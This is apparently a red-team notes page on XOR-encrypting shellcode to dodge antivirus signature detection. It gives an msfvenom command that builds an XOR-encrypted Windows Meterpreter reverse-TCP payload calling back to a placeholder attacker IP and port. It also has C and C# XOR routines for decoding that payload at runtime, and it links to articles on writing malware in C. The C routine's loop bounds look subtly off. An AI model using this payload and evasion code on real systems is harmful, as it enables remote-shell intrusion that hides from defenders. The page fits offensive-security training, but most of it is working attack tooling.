# XOR

> [!WARNING] Entropy Indication
> Encrypting shellcode will increase the entropy significantly.
>> [!TIP]
>> Try to obfuscate the shellcode to make it less obvious from signature detections.

## #metasploit

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt xor --encrypt-key x0rk3y -f c -o payload_xor.c
```

## C

```c
#include <string.h>

void XOR(PBYTE data, size_t data_length, PBYTE key, size_t key_length) {
	DWORD j = 0;
	
	for(DWORD i = 0; i < data_length - 1; i++) {
		if(j == key_length - 1) j = 0;
		
		data[i] ^= key[j];
		j++;
  }
}

int main() {
	unsigned char shellcode[] = "";
	unsigned char key[] = "";

	XOR(shellcode, sizeof(shellcode), key, sizeof(key));

	return 0;
}
```

## C\#

```cs
class Program {
	private static byte[] xor(byte[] data, byte[] key) {
		byte[] bytes = new byte[data.Length];
		
		for (int i = 0; i < data.Length; i++) {
			bytes[i] = (byte)(data[i] ^ key[i % key.Length]);
		}
		
		return bytes;
	}
}
```

---
## References

### Backlinks

- [[Entropy]]

### Rapid7

- [Rapid7: How to XOR with Metasploit Framework Compiler](https://github.com/rapid7/metasploit-framework/wiki/How-to-XOR-with-Metasploit-Framework-Compiler)

### Assume Breach

- [Assume Breach: Let’s Make Some Malware In C - Part 1](https://assume-breach.medium.com/home-grown-red-team-lets-make-some-malware-in-c-part-1-dc48fb360658)

- [Assume Breach: Let’s Make Some Malware In C - Part 2](https://assume-breach.medium.com/home-grown-red-team-lets-make-some-malware-in-c-part-2-27a9a6def9b0)

- [Assume Breach: Let’s Make Some Malware In C - Part 3](https://assume-breach.medium.com/home-grown-red-team-lets-make-some-malware-in-c-part-3-223b7e81133e)